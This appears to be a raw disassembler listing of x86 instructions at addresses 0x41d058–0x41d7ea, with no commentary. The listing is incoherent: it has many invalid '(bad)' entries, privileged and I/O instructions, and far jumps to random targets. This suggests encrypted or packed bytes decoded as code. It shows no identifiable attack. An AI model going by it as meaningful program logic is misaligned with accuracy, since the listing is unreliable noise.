  41d058:	xchg   esi,eax
  41d059:	imul   BYTE PTR ds:0xeae6dcf6
  41d05f:	adc    eax,0x9242725d
  41d064:	adc    esi,DWORD PTR [ebp-0x3b]
  41d067:	sub    dl,BYTE PTR [edx+0x49]
  41d06a:	push   cs
  41d06b:	mov    edi,DWORD PTR [esi-0x5b367b13]
  41d071:	dec    esp
  41d072:	jg     0x41d075
  41d074:	popf   
  41d075:	xchg   DWORD PTR ds:0xab4af8a3,esi
  41d07b:	inc    edx
  41d07c:	jmp    0x4c90c4a5
  41d081:	mov    dh,0x18
  41d083:	xchg   DWORD PTR ss:[edi-0x1b],esp
  41d087:	scas   eax,DWORD PTR es:[edi]
  41d088:	dec    esp
  41d089:	adc    DWORD PTR [edx-0x6141ebcd],edi
  41d08f:	js     0x41d023
  41d091:	iret   
  41d092:	ja     0x41d083
  41d094:	mov    fs,WORD PTR [edi-0x4145125a]
  41d09a:	add    eax,0x7fac60bf
  41d09f:	call   0xc3fa6ba7
  41d0a4:	xor    edx,DWORD PTR [esi+0x4157ddb]
  41d0aa:	pop    ebx
  41d0ab:	add    BYTE PTR [eax+0x55e726cb],ah
  41d0b1:	push   es
  41d0b2:	jae    0x41d077
  41d0b4:	aaa    
  41d0b5:	adc    eax,DWORD PTR [eax-0x285bce1d]
  41d0bb:	cs ins BYTE PTR es:[edi],dx
  41d0bd:	ficomp DWORD PTR [ebp+0x29b111c6]
  41d0c3:	scas   eax,DWORD PTR es:[edi]
  41d0c4:	fnstenv [eax+0xfc7ade5]
  41d0ca:	retf   0x350b
  41d0cd:	out    dx,al
  41d0ce:	add    al,0x95
  41d0d0:	mov    al,0x79
  41d0d2:	add    DWORD PTR [ecx+0x6032b875],0x9835a864
  41d0dc:	frstor [edi]
  41d0de:	push   esp
  41d0df:	ins    DWORD PTR es:[edi],dx
  41d0e0:	mov    ds:0x86b57c74,al
  41d0e5:	mov    cl,0x6d
  41d0e7:	mov    ebx,0xca363bff
  41d0ec:	pop    ebp
  41d0ed:	push   esp
  41d0ee:	and    al,0x71
  41d0f0:	inc    ebx
  41d0f1:	xlat   BYTE PTR ds:[ebx]
  41d0f2:	jns    0x41d14b
  41d0f4:	ja     0x41d0fb
  41d0f6:	stos   BYTE PTR es:[edi],al
  41d0f7:	add    BYTE PTR [esi-0x25],ah
  41d0fa:	xchg   esi,eax
  41d0fb:	pop    esp
  41d0fc:	push   es
  41d0fd:	dec    ebx
  41d0fe:	mov    al,0xfc
  41d100:	cmp    al,0xb2
  41d102:	cdq    
  41d103:	fs push edx
  41d105:	mov    eax,0x5abb2d3e
  41d10a:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41d10c:	push   ds
  41d10d:	mov    ?,WORD PTR [eax]
  41d10f:	mov    ds:0x3278ef20,eax
  41d114:	jnp    0x41d0e2
  41d116:	pop    eax
  41d117:	sub    DWORD PTR [ecx+0x78c285ca],0x2dd6cca6
  41d121:	xor    DWORD PTR [edx+0x45c64422],edx
  41d127:	(bad)  
  41d129:	xchg   bh,dl
  41d12b:	in     al,dx
  41d12c:	gs inc esi
  41d12e:	push   ebx
  41d12f:	nop
  41d130:	jo     0x41d0c8
  41d132:	loop   0x41d121
  41d134:	mov    eax,ds:0xc4026a3c
  41d139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d13a:	rcr    BYTE PTR [ebp-0x3e4c7005],0xe5
  41d141:	sbb    BYTE PTR [esi-0x57],cl
  41d144:	xor    DWORD PTR [eax],eax
  41d146:	push   edi
  41d147:	mov    ah,0xb6
  41d149:	inc    edx
  41d14a:	dec    ecx
  41d14b:	sahf   
  41d14c:	push   cs
  41d14d:	and    al,0xdf
  41d14f:	jno    0x41d107
  41d151:	std    
  41d152:	adc    DWORD PTR [eax],edi
  41d154:	loop   0x41d117
  41d156:	fisub  WORD PTR [edx+eax*4]
  41d159:	inc    ebx
  41d15a:	sbb    DWORD PTR [esi+ecx*1-0x6339cdd9],eax
  41d161:	imul   esi,DWORD PTR [ecx],0x1935a140
  41d167:	ins    BYTE PTR es:[edi],dx
  41d168:	js     0x41d189
  41d16a:	xor    al,0xd9
  41d16c:	out    dx,al
  41d16d:	hlt    
  41d16e:	mov    DWORD PTR [esi+0x642c3f15],ebp
  41d174:	inc    ecx
  41d175:	xchg   edi,eax
  41d176:	cmp    BYTE PTR [edx-0x214fc39b],ch
  41d17c:	xor    eax,0x85a6eb6b
  41d181:	arpl   WORD PTR [ebp+0x6c],dx
  41d184:	aaa    
  41d185:	pop    ebx
  41d186:	in     eax,0xb8
  41d188:	mov    ebp,edi
  41d18a:	leave  
  41d18b:	aaa    
  41d18c:	shl    DWORD PTR [esi+0x36],0xd0
  41d190:	dec    esp
  41d191:	mov    cl,0xab
  41d193:	les    ebx,FWORD PTR [ebp-0x2b85423f]
  41d199:	mov    ebp,0xffe32980
  41d19e:	cdq    
  41d19f:	add    DWORD PTR [ecx+0x56],esp
  41d1a2:	aaa    
  41d1a3:	pop    ss
  41d1a4:	sub    eax,DWORD PTR [ebx]
  41d1a6:	popf   
  41d1a7:	data16 aad 0x25
  41d1aa:	jp     0x41d148
  41d1ac:	pop    esi
  41d1ad:	fist   WORD PTR [ecx+0x70]
  41d1b0:	jg     0x41d175
  41d1b2:	dec    edi
  41d1b3:	pop    ds
  41d1b4:	mov    ecx,0xd921b9cb
  41d1b9:	test   al,0xf3
  41d1bb:	pop    esp
  41d1bc:	push   ebp
  41d1bd:	push   0x49bc90f8
  41d1c2:	pop    ebp
  41d1c3:	add    bh,BYTE PTR [ebx+0x4f]
  41d1c6:	cmp    ebp,DWORD PTR [esi+edi*1+0x16]
  41d1ca:	lods   eax,DWORD PTR ds:[esi]
  41d1cb:	xor    edx,DWORD PTR [esi]
  41d1cd:	ret    
  41d1ce:	cmc    
  41d1cf:	mov    ds:0xd995d2f4,eax
  41d1d4:	fwait
  41d1d5:	sbb    eax,0x3a3022f2
  41d1da:	push   0x3470636e
  41d1df:	sbb    DWORD PTR ss:[edi-0x6],ebp
  41d1e3:	cmc    
  41d1e4:	inc    eax
  41d1e5:	(bad)  
  41d1e6:	mov    bl,0x95
  41d1e8:	sub    eax,0xda66863
  41d1ed:	jne    0x41d1f0
  41d1ef:	jg     0x41d1a5
  41d1f1:	ficomp WORD PTR [ebx+0x7b]
  41d1f4:	mov    esp,DWORD PTR [ebp-0x72343067]
  41d1fa:	fsincos 
  41d1fc:	je     0x41d229
  41d1fe:	pusha  
  41d1ff:	pop    es
  41d200:	cmp    al,0x59
  41d202:	mov    dh,0x58
  41d204:	sub    al,0x39
  41d206:	sti    
  41d207:	ins    DWORD PTR es:[edi],dx
  41d208:	sub    al,0x36
  41d20a:	cwde   
  41d20b:	into   
  41d20c:	mov    bl,0x2d
  41d20e:	ins    BYTE PTR es:[edi],dx
  41d20f:	ror    eax,cl
  41d211:	repnz push ebx
  41d213:	scas   eax,DWORD PTR es:[edi]
  41d214:	pop    ecx
  41d215:	(bad)  
  41d217:	add    dh,BYTE PTR [edi]
  41d219:	mov    edx,0xbc687789
  41d21e:	out    dx,eax
  41d21f:	jae    0x41d296
  41d221:	(bad)  
  41d222:	fmul   DWORD PTR [esp+esi*8-0x7946c682]
  41d229:	xor    al,0x1e
  41d22b:	enter  0x1eb7,0x2a
  41d22f:	add    DWORD PTR [ecx],ebx
  41d231:	out    0x13,eax
  41d233:	lds    esp,FWORD PTR [ebp-0x18b866b9]
  41d239:	mov    ah,0x39
  41d23b:	in     eax,0x22
  41d23d:	sub    al,0x72
  41d23f:	in     al,dx
  41d240:	shl    BYTE PTR [edx-0x45ee05d1],0x8c
  41d247:	sub    DWORD PTR [edx+0x4a],ebx
  41d24a:	mov    al,0xa9
  41d24c:	lea    edi,[eax-0x76140fa1]
  41d252:	sar    DWORD PTR [edi+0x48],1
  41d255:	std    
  41d256:	xchg   esi,eax
  41d257:	vpunpckhbw ymm7,ymm1,YMMWORD PTR [esp+edx*4+0x4b]
  41d25d:	inc    ebx
  41d25e:	int    0x21
  41d260:	arpl   WORD PTR [esi],sp
  41d262:	mov    ebp,0xc12c97e0
  41d267:	jle    0x41d28c
  41d269:	mov    bh,0xb7
  41d26b:	cmp    eax,DWORD PTR [eax]
  41d26d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d26e:	and    DWORD PTR [edx],0xb85045a8
  41d274:	cwde   
  41d275:	xchg   esi,eax
  41d276:	jmp    0x1fa8:0x4a5bf09f
  41d27d:	fimul  WORD PTR [ecx]
  41d27f:	sub    eax,0xe22c095
  41d284:	mov    al,ds:0xa16305ba
  41d289:	ret    
  41d28a:	xchg   DWORD PTR [ebp-0x6b520ee2],ebx
  41d290:	scas   eax,DWORD PTR es:[edi]
  41d291:	pop    ss
  41d292:	mov    DWORD PTR [eax-0x53],edx
  41d295:	push   0xffffff8e
  41d297:	push   0x6ec74d78
  41d29c:	push   edx
  41d29d:	imul   edi,edi,0x2f698db
  41d2a3:	dec    edx
  41d2a4:	into   
  41d2a5:	xchg   BYTE PTR [ebp-0x6a],ah
  41d2a8:	xor    dh,BYTE PTR [eax-0x67]
  41d2ab:	sub    al,0x7c
  41d2ad:	ret    
  41d2ae:	or     edi,edi
  41d2b0:	pop    es
  41d2b1:	fmul   QWORD PTR [esi-0x4]
  41d2b4:	mov    dl,bl
  41d2b6:	dec    ecx
  41d2b7:	pop    ss
  41d2b8:	push   edx
  41d2b9:	xchg   bl,dl
  41d2bb:	adc    DWORD PTR [ebx+0x198c252a],ebx
  41d2c1:	jg     0x41d262
  41d2c3:	jecxz  0x41d2c2
  41d2c5:	scas   eax,DWORD PTR es:[edi]
  41d2c6:	sahf   
  41d2c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2c8:	jmp    0xcf8f7201
  41d2cd:	aam    0xb7
  41d2cf:	xchg   bl,bh
  41d2d1:	lock sahf 
  41d2d3:	push   es
  41d2d4:	mov    ch,0x8e
  41d2d6:	repnz pop edx
  41d2d8:	pop    ebx
  41d2d9:	mov    ds:0xdb447f98,eax
  41d2de:	jg     0x41d2c1
  41d2e0:	fnstenv [ebx+0x2659f8de]
  41d2e6:	(bad)  
  41d2e7:	leave  
  41d2e8:	call   0xd6ac2d3a
  41d2ed:	jmp    0x1032:0x4f634379
  41d2f4:	test   BYTE PTR [esi+0x713161f],bh
  41d2fa:	mov    bl,0x6d
  41d2fc:	sub    al,0x43
  41d2fe:	jmp    0x9b812860
  41d303:	cmp    BYTE PTR [ecx+edi*2+0x53],ch
  41d307:	daa    
  41d308:	(bad)  
  41d30a:	xchg   esi,eax
  41d30b:	mov    bl,BYTE PTR [ebx-0x2ce54b7]
  41d311:	mov    ah,0xdd
  41d313:	into   
  41d314:	sbb    edi,DWORD PTR [ebx-0x2e]
  41d317:	rol    BYTE PTR [esi+ebx*8-0x30895a0f],cl
  41d31e:	rcr    BYTE PTR [edi-0x1d],0xb0
  41d322:	pop    ebx
  41d323:	ja     0x41d2bc
  41d325:	cmc    
  41d326:	out    dx,al
  41d327:	icebp  
  41d328:	loope  0x41d32f
  41d32a:	aam    0xd8
  41d32c:	cmp    ecx,0x15
  41d32f:	xchg   ecx,eax
  41d330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d331:	jl     0x41d2eb
  41d333:	loop   0x41d310
  41d335:	sar    ebp,0x5c
  41d338:	jbe    0x41d32a
  41d33a:	rol    BYTE PTR [edi+edx*2+0x147e301d],1
  41d341:	gs push es
  41d343:	div    DWORD PTR [edi-0x2088d455]
  41d349:	xchg   ebp,eax
  41d34a:	aad    0xbe
  41d34c:	push   edi
  41d34d:	fidivr WORD PTR [esi]
  41d34f:	pop    ss
  41d350:	out    0x3a,eax
  41d352:	repz call 0x5d67d0e6
  41d358:	push   es
  41d359:	cmp    al,0xff
  41d35b:	fsub   st,st(4)
  41d35d:	das    
  41d35e:	imul   esi,DWORD PTR [edi+0x28],0x91b8decf
  41d365:	pop    edi
  41d366:	aaa    
  41d367:	pop    ss
  41d368:	sub    eax,0xd8e720ed
  41d36d:	ret    0x9835
  41d370:	xor    al,0x16
  41d372:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41d374:	sub    BYTE PTR [ebx-0x28aeebeb],dh
  41d37a:	mov    ah,0xe2
  41d37c:	mov    WORD PTR [edi+ebp*1],?
  41d37f:	(bad)  [ecx-0x24eed543]
  41d385:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d386:	mov    edi,DWORD PTR [edx-0x16614cc0]
  41d38c:	mov    ch,0x57
  41d38e:	mov    ah,0x75
  41d390:	imul   BYTE PTR [ecx+0x41]
  41d393:	loop   0x41d396
  41d395:	jl     0x41d332
  41d397:	fsubr  DWORD PTR [ebx]
  41d399:	aas    
  41d39a:	jmp    0x4a06:0x78acd7e5
  41d3a1:	int3   
  41d3a2:	ret    0x6c69
  41d3a5:	rcl    DWORD PTR [esi+0x4caf4132],1
  41d3ab:	lods   al,BYTE PTR ds:[esi]
  41d3ac:	pop    edi
  41d3ad:	jns    0x41d3ce
  41d3af:	sub    dl,BYTE PTR [edx+0x3170b032]
  41d3b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3b6:	pop    edx
  41d3b7:	cwde   
  41d3b8:	clc    
  41d3b9:	mov    ss,ebx
  41d3bb:	test   eax,0x552bdeb8
  41d3c0:	add    cl,BYTE PTR [ebx+0x47]
  41d3c3:	sub    al,0x3f
  41d3c5:	sub    DWORD PTR [edi+ebx*8-0x13],ecx
  41d3c9:	pushf  
  41d3ca:	xchg   ebp,esp
  41d3cc:	dec    edx
  41d3ce:	jg     0x41d43d
  41d3d0:	(bad)
  41d3d4:	pop    eax
  41d3d5:	sub    BYTE PTR ds:0xb9b24bdb,ch
  41d3db:	jl     0x41d37a
  41d3dd:	gs arpl si,si
  41d3e0:	adc    DWORD PTR [ebx+0x1dec1194],eax
  41d3e6:	sbb    eax,0xbd0fdde1
  41d3eb:	fsub   DWORD PTR [esi+0x48]
  41d3ee:	pop    esi
  41d3ef:	adc    esi,ebx
  41d3f1:	nop
  41d3f2:	imul   esp,DWORD PTR [esi+0x435df661],0xd
  41d3f9:	mov    esi,DWORD PTR [eax-0x72]
  41d3fc:	inc    ecx
  41d3fd:	(bad)  
  41d3fe:	loope  0x41d439
  41d400:	mul    edi
  41d402:	push   esp
  41d403:	hlt    
  41d404:	aas    
  41d405:	push   cs
  41d406:	test   DWORD PTR [ebx-0x66aaf6ab],esp
  41d40c:	mov    esp,0x347cdd9a
  41d411:	cmc    
  41d412:	mov    DWORD PTR [ecx+0x5fc89241],0x812e58c8
  41d41c:	fisttp DWORD PTR [ecx+0x7b2093ce]
  41d422:	push   edx
  41d423:	push   ss
  41d424:	xor    al,0xb4
  41d426:	test   eax,0xd4885832
  41d42b:	mov    dl,0x86
  41d42d:	loop   0x41d3af
  41d42f:	pop    esp
  41d430:	adc    al,0x18
  41d432:	pop    edx
  41d433:	xor    eax,0xf6e3bf1a
  41d438:	xchg   esp,eax
  41d439:	ror    edx,1
  41d43b:	xchg   ebp,eax
  41d43c:	pop    edi
  41d43d:	inc    eax
  41d43e:	add    edi,edi
  41d440:	mov    ecx,0xae7bc5b9
  41d445:	mov    edi,0x1d79e804
  41d44a:	add    BYTE PTR [ecx+0x3a],ah
  41d44d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d44e:	xlat   BYTE PTR ds:[ebx]
  41d44f:	cs mov esp,0x594300e
  41d455:	sub    al,0x9d
  41d457:	out    0x3d,eax
  41d459:	in     al,dx
  41d45a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d45b:	dec    ebx
  41d45c:	mov    WORD PTR [esi+0x35c2d1d6],ss
  41d462:	fisttp QWORD PTR [ebx]
  41d464:	imul   ebp
  41d466:	(bad)  
  41d467:	mov    al,ds:0xfb07ae93
  41d46c:	sbb    al,0x43
  41d46e:	fwait
  41d46f:	sar    BYTE PTR [eax-0x70],1
  41d472:	pop    es
  41d473:	js     0x41d40a
  41d475:	xor    al,BYTE PTR ds:0xb293d2d0
  41d47b:	mov    ds:0x7c0fa181,eax
  41d480:	call   0x35a2:0xf4e425e3
  41d487:	add    BYTE PTR [ebx-0x65d1b352],cl
  41d48d:	sub    eax,0xc0749e62
  41d492:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d493:	cdq    
  41d494:	jg     0x41d421
  41d496:	xchg   edi,eax
  41d497:	dec    edi
  41d498:	push   esi
  41d499:	pop    esp
  41d49a:	jg     0x41d428
  41d49c:	or     al,0x4c
  41d49e:	pop    es
  41d49f:	sub    edx,DWORD PTR [edi+0x19d51395]
  41d4a5:	mov    bl,0xcc
  41d4a7:	not    BYTE PTR [ecx+0x43e0e2bd]
  41d4ad:	adc    BYTE PTR [esp+ecx*4+0x16],dh
  41d4b1:	clc    
  41d4b2:	fiadd  DWORD PTR [edi]
  41d4b4:	mov    bh,0x77
  41d4b6:	adc    al,0x20
  41d4b8:	ds out 0x23,al
  41d4bb:	stos   DWORD PTR es:[edi],eax
  41d4bc:	test   al,0x1d
  41d4be:	scas   eax,DWORD PTR es:[edi]
  41d4bf:	sub    BYTE PTR [ecx-0xf673ed0],0x14
  41d4c6:	xchg   esp,eax
  41d4c7:	xchg   BYTE PTR [edi+0x30ffef3d],ch
  41d4cd:	outs   dx,DWORD PTR ds:[esi]
  41d4ce:	jmp    0x41d462
  41d4d0:	fwait
  41d4d1:	sbb    esi,DWORD PTR [edx+0x623da0ac]
  41d4d7:	gs add ebx,edx
  41d4da:	pop    ebx
  41d4db:	enter  0xafd7,0xac
  41d4df:	imul   edx,DWORD PTR [edi+edi*8-0x2ce5d7da],0xffffffe9
  41d4e7:	sub    al,0x5
  41d4e9:	mov    esi,0x7bfa1e82
  41d4ee:	pop    ebx
  41d4ef:	jmp    0xbbe3056a
  41d4f4:	jl     0x41d49f
  41d4f6:	mov    ds:0x730b50e5,eax
  41d4fb:	aaa    
  41d4fc:	pushf  
  41d4fd:	sub    edi,DWORD PTR [ecx]
  41d4ff:	pop    esi
  41d500:	test   esp,esp
  41d502:	in     al,dx
  41d503:	aad    0xfb
  41d505:	xchg   bh,dh
  41d507:	xchg   ecx,eax
  41d508:	ss inc ecx
  41d50a:	push   esp
  41d50b:	pop    ebx
  41d50c:	xor    esi,eax
  41d50e:	(bad)  
  41d50f:	icebp  
  41d510:	add    al,0x9f
  41d512:	loopne 0x41d526
  41d514:	push   esp
  41d515:	lock push 0x72
  41d518:	repnz in al,dx
  41d51a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d51b:	fstp   TBYTE PTR [eax]
  41d51d:	adc    edx,0x2f
  41d520:	or     eax,0x6da14773
  41d525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d526:	rol    BYTE PTR [eax+ecx*2+0x755465a2],1
  41d52d:	fcmovbe st,st(0)
  41d52f:	mov    bh,0xef
  41d531:	inc    eax
  41d532:	mov    ds:0xc9ab171f,eax
  41d537:	jns    0x41d4b9
  41d539:	jae    0x41d4cc
  41d53b:	adc    al,0xe5
  41d53d:	add    edx,0xffffff87
  41d540:	xchg   edi,eax
  41d541:	mov    dl,0xbd
  41d543:	loopne 0x41d537
  41d545:	cwde   
  41d546:	ins    DWORD PTR es:[edi],dx
  41d547:	jb     0x41d50f
  41d549:	jbe    0x41d4d9
  41d54b:	aad    0xee
  41d54d:	sbb    eax,0xb7ec5b5c
  41d552:	(bad)  
  41d553:	fcom   DWORD PTR [edx+0x8f3a7c6]
  41d559:	jno    0x41d5af
  41d55b:	or     esi,ecx
  41d55d:	jns    0x41d5d9
  41d55f:	mov    dl,BYTE PTR [ebx+esi*2]
  41d562:	aad    0x6c
  41d564:	int3   
  41d565:	xchg   edi,eax
  41d566:	out    0xa4,eax
  41d568:	(bad)  
  41d56a:	cmp    BYTE PTR [esi-0x6f0bba49],dh
  41d570:	imul   DWORD PTR [ecx]
  41d572:	xchg   esi,eax
  41d573:	jmp    0xd116:0xa7c010e0
  41d57a:	test   eax,0xcec3ecfc
  41d57f:	inc    ebx
  41d580:	fiadd  WORD PTR [eax]
  41d582:	loope  0x41d594
  41d584:	hlt    
  41d585:	mov    BYTE PTR [ebp+0x5f463832],ch
  41d58b:	cmp    al,0x4a
  41d58d:	jle    0x41d513
  41d58f:	lods   al,BYTE PTR ds:[esi]
  41d590:	adc    esp,esp
  41d592:	je     0x41d601
  41d594:	jnp    0x41d60f
  41d596:	cli    
  41d597:	fs out 0x84,al
  41d59a:	arpl   WORD PTR [edi+0x214fa90],ax
  41d5a0:	stc    
  41d5a1:	sahf   
  41d5a2:	cmp    edi,DWORD PTR [edx-0x32a1d13a]
  41d5a8:	push   ecx
  41d5a9:	xor    edi,DWORD PTR [edi+0x29da4825]
  41d5af:	enter  0xb9af,0x52
  41d5b3:	out    0x9d,eax
  41d5b5:	mov    eax,ds:0xe9373aa3
  41d5ba:	(bad)  
  41d5bb:	int    0x9
  41d5bd:	jns    0x41d5a2
  41d5bf:	aad    0xe2
  41d5c1:	popa   
  41d5c2:	or     bh,BYTE PTR [ebp-0x5]
  41d5c5:	cmp    al,0xc1
  41d5c7:	cmp    eax,DWORD PTR [eax-0x27]
  41d5ca:	add    al,0xdf
  41d5cc:	loope  0x41d631
  41d5ce:	hlt    
  41d5cf:	dec    edi
  41d5d0:	mov    esp,0xbce55c6a
  41d5d5:	repnz out dx,al
  41d5d7:	and    al,BYTE PTR [ebx]
  41d5d9:	push   cs
  41d5da:	pop    es
  41d5db:	inc    ebp
  41d5dc:	mov    ss,WORD PTR [edx-0x61]
  41d5df:	in     al,0x3f
  41d5e1:	cld    
  41d5e2:	and    dh,BYTE PTR [esi+0x53e7c688]
  41d5e8:	dec    eax
  41d5e9:	fs fwait
  41d5eb:	push   esi
  41d5ec:	fwait
  41d5ed:	xchg   esp,eax
  41d5ee:	jmp    0x66bc:0x9cec9c9a
  41d5f5:	sbb    DWORD PTR [ecx-0x6441ad57],edx
  41d5fb:	mov    ds:0xb52b77d,eax
  41d600:	lock jbe 0x41d675
  41d603:	cli    
  41d604:	fs push esi
  41d606:	(bad)  
  41d608:	push   ds
  41d609:	mov    dl,0x1b
  41d60b:	mov    esi,DWORD PTR [ebx-0x19]
  41d60e:	inc    ecx
  41d60f:	ins    BYTE PTR es:[edi],dx
  41d610:	cmp    DWORD PTR [esi],edx
  41d612:	sbb    eax,DWORD PTR [esi-0x10222fc5]
  41d618:	fisub  DWORD PTR [ecx+0x1d]
  41d61b:	retf   0x8de8
  41d61e:	cmc    
  41d61f:	sbb    al,0x80
  41d621:	lods   eax,DWORD PTR ds:[esi]
  41d622:	inc    ebp
  41d623:	ret    0xfbd6
  41d626:	cli    
  41d627:	pop    edx
  41d628:	pop    edi
  41d629:	int    0x3d
  41d62b:	pop    ecx
  41d62c:	dec    esp
  41d62d:	mov    eax,ds:0x560ab9f4
  41d632:	inc    ebp
  41d633:	pusha  
  41d634:	or     DWORD PTR [edi-0x4c],ecx
  41d637:	test   BYTE PTR [eax-0x765a2775],al
  41d63d:	sub    DWORD PTR [ebp-0x69c4fca7],edi
  41d643:	(bad)  
  41d644:	or     al,0x98
  41d646:	cs jmp 0x697e4a24
  41d64c:	adc    al,0xa9
  41d64e:	pop    eax
  41d64f:	pop    eax
  41d650:	addr16 idiv ebx
  41d653:	mov    al,ds:0x707aa80
  41d658:	out    dx,eax
  41d659:	jle    0x41d6a5
  41d65b:	fwait
  41d65c:	into   
  41d65d:	adc    ch,al
  41d65f:	inc    esi
  41d660:	mov    bl,0x63
  41d662:	inc    eax
  41d663:	sbb    ah,bh
  41d665:	fldenv ss:[edx]
  41d668:	fld    TBYTE PTR [edi]
  41d66a:	sub    dl,bh
  41d66c:	xchg   esp,eax
  41d66d:	mov    bl,0xa9
  41d66f:	add    BYTE PTR [eax-0x7c],cl
  41d672:	adc    dh,BYTE PTR [edx+eax*8]
  41d675:	mov    eax,ds:0x99cd9f62
  41d67a:	ins    DWORD PTR es:[edi],dx
  41d67b:	(bad)  
  41d67c:	mov    eax,0x1ff9433c
  41d681:	inc    eax
  41d682:	inc    cx
  41d684:	cmp    BYTE PTR [ecx],0x8a
  41d687:	add    BYTE PTR [edi+esi*8+0x55],bl
  41d68b:	xchg   bl,ch
  41d68d:	jmp    0x6c98:0x5a080a0b
  41d694:	mov    esi,0x961de064
  41d699:	mov    BYTE PTR [ebx-0x5d],ah
  41d69c:	xchg   ebx,eax
  41d69d:	mov    fs,esp
  41d69f:	adc    DWORD PTR [esi-0x61],eax
  41d6a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6a3:	call   0x265145fc
  41d6a8:	push   eax
  41d6a9:	in     al,dx
  41d6aa:	out    0x42,al
  41d6ac:	push   ebp
  41d6ad:	sub    BYTE PTR [ecx],dl
  41d6af:	adc    dl,dl
  41d6b1:	in     al,0x22
  41d6b3:	loopne 0x41d6ce
  41d6b5:	stos   BYTE PTR es:[edi],al
  41d6b6:	pop    es
  41d6b7:	mov    dl,0xfc
  41d6b9:	out    dx,eax
  41d6ba:	shl    DWORD PTR [ebp-0x37],1
  41d6bd:	test   DWORD PTR [esp+eax*4+0x1810a57f],eax
  41d6c4:	bound  esi,QWORD PTR [edx-0x751752e9]
  41d6ca:	jg     0x41d6cb
  41d6cc:	pop    esp
  41d6cd:	sbb    eax,0x818a6bc8
  41d6d2:	cmc    
  41d6d3:	pop    ds
  41d6d4:	or     DWORD PTR [eax],edi
  41d6d6:	mov    ch,0xb
  41d6d8:	fsubr  QWORD PTR [esi+0xdfa3aa1]
  41d6de:	clc    
  41d6df:	iret   
  41d6e0:	addr16 (bad) 
  41d6e2:	sbb    ebp,DWORD PTR [esi-0x599ef7f7]
  41d6e8:	jmp    0x41d722
  41d6ea:	push   edi
  41d6eb:	fmul   DWORD PTR [eax-0x7b]
  41d6ee:	popa   
  41d6ef:	sub    eax,0x31bb3d9b
  41d6f4:	gs dec edi
  41d6f6:	mov    ebp,DWORD PTR [edi+edx*4+0xb87def2]
  41d6fd:	lods   eax,DWORD PTR ds:[esi]
  41d6fe:	push   ds
  41d6ff:	jmp    DWORD PTR [ecx]
  41d701:	call   0xae29e8aa
  41d706:	inc    edi
  41d707:	fld    DWORD PTR [esp+eiz*4]
  41d70a:	repnz xchg esp,eax
  41d70c:	outs   dx,BYTE PTR ds:[esi]
  41d70d:	mov    ah,0x78
  41d70f:	or     DWORD PTR [eax+ecx*1-0x25271c87],edx
  41d716:	jns    0x41d74a
  41d718:	mov    DWORD PTR [edx],0x83d2f2
  41d71e:	mov    al,0xdf
  41d720:	push   ss
  41d721:	pop    esi
  41d722:	in     eax,dx
  41d723:	rcl    BYTE PTR [edx],1
  41d725:	pop    esp
  41d726:	dec    ecx
  41d727:	jle    0x41d6eb
  41d729:	stos   DWORD PTR es:[edi],eax
  41d72a:	jo     0x41d7a8
  41d72c:	cwde   
  41d72d:	stc    
  41d72e:	addr16 inc edx
  41d730:	xchg   esi,eax
  41d731:	adc    cl,BYTE PTR [ecx+0x4ad64c4f]
  41d737:	mov    eax,0x92a3a792
  41d73c:	push   es
  41d73d:	pop    edi
  41d73e:	fist   DWORD PTR [ecx-0x61]
  41d741:	popf   
  41d742:	lock push ss
  41d744:	adc    al,0x74
  41d746:	xor    eax,0xbd3cf375
  41d74b:	xor    eax,0x4142ace2
  41d750:	mov    ebp,0x69890ca1
  41d755:	dec    ebp
  41d756:	cmp    DWORD PTR [esi+0x45],0x2cdc296f
  41d75d:	mov    ah,0x36
  41d75f:	and    ah,0x9f
  41d762:	repz and bl,BYTE PTR [eax-0x7c8f4c30]
  41d769:	mov    al,ds:0x8625aad6
  41d76e:	fisubr WORD PTR [eax-0x52fde5b0]
  41d774:	push   ebx
  41d775:	daa    
  41d776:	out    dx,eax
  41d777:	fld    DWORD PTR [ebp-0xe]
  41d77a:	xor    BYTE PTR ds:0x22be2acc,0xd4
  41d781:	dec    eax
  41d782:	bound  ebx,QWORD PTR ds:0x2fe11fb8
  41d788:	adc    edi,eax
  41d78a:	daa    
  41d78b:	(bad)  
  41d78c:	mul    BYTE PTR [eax+0x316c955c]
  41d792:	test   eax,0x7e8bede7
  41d797:	ins    BYTE PTR es:[edi],dx
  41d798:	out    0xb2,al
  41d79a:	clc    
  41d79b:	sbb    edx,esi
  41d79d:	fs jecxz 0x41d761
  41d7a0:	jg     0x41d7a8
  41d7a2:	das    
  41d7a3:	push   edx
  41d7a4:	jno    0x41d7ec
  41d7a6:	and    eax,0xa096f964
  41d7ac:	jo     0x41d82c
  41d7ae:	es push ss
  41d7b0:	dec    esp
  41d7b1:	sub    BYTE PTR [ebp+edx*1+0x31],cl
  41d7b5:	inc    esp
  41d7b6:	fld    TBYTE PTR [ebx+eiz*8-0x2356d0ca]
  41d7bd:	icebp  
  41d7be:	push   ds
  41d7bf:	inc    edi
  41d7c0:	cs xchg edx,eax
  41d7c2:	pop    esp
  41d7c3:	bound  esi,QWORD PTR [eax+0x18391bde]
  41d7c9:	jecxz  0x41d767
  41d7cb:	jmp    0x4b2f:0xfc868fae
  41d7d2:	jl     0x41d80e
  41d7d4:	sahf   
  41d7d5:	test   BYTE PTR [ebx],0x9b
  41d7d8:	cmp    bl,ah
  41d7da:	outs   dx,DWORD PTR ds:[esi]
  41d7db:	xchg   ebx,eax
  41d7dc:	jo     0x41d7d2
  41d7de:	pop    esi
  41d7df:	jg     0x41d7de
  41d7e1:	mov    ebp,DWORD PTR [esi+0x1ccbeb75]
  41d7e7:	je     0x41d7ce
  41d7e9:	lods   eax,DWORD PTR ds:[esi]
  41d7ea:	xor    esi,DWORD PTR [esi+eax*8]
